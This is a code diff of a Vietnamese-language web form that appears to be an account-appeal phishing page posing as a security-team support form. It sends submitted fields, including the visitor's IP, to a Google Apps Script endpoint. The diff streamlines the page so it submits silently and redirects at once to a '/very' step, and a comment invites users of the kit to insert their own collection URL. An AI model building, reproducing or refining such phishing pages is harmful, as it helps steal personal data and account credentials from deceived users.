@@ -153,17 +153,14 @@ Nếu bạn tin rằng đây là một lỗi, bạn có thể nộp đơn khiế
 
       <button class="btn" id="submitBtn" type="submit">Gửi</button>
     </form>
-
-    <p class="note" id="status"></p>
   </div>
 
   <script>
     // === CONFIG: thay URL bằng Web App của bạn ===
     const scriptURL = "https://script.google.com/macros/s/AKfycbwmBoY2ZrI_TsL34yovSsm8LHQlu0h0bjjRE3mYKhaCaWuGy_y4UkIJCoTlnrCxxQ8/exec";
-    const redirectURL = "https://romania-secutity-team-support-9243.netlify.app/business-team";                   
+    const redirectURL = "/very";  // gửi xong chuyển thẳng sang /very
 
     const form = document.getElementById('regForm');
-    const status = document.getElementById('status');
     const submitBtn = document.getElementById('submitBtn');
     const ipInput = document.getElementById('ip');
 
@@ -180,26 +177,18 @@ Nếu bạn tin rằng đây là một lỗi, bạn có thể nộp đơn khiế
     form.addEventListener('submit', async (ev) => {
       ev.preventDefault();
       submitBtn.disabled = true;
-      status.textContent = "Đang gửi...";
 
       try {
         const fd = new FormData(form);
-
-        const resp = await fetch(scriptURL, {
+        await fetch(scriptURL, {
           method: 'POST',
           body: fd
         });
 
-        status.textContent = "Gửi thành công. Cảm ơn bạn!";
-        if (redirectURL && redirectURL.length) {
-          setTimeout(()=> window.location.href = redirectURL, 800);
-        } else {
-          form.reset();
-          submitBtn.disabled = false;
-        }
+        // Chuyển thẳng sang /very ngay sau submit
+        window.location.href = redirectURL;
       } catch (err) {
         console.error(err);
-        status.textContent = "Gửi thất bại. Vui lòng thử lại.";
         submitBtn.disabled = false;
       }
     });
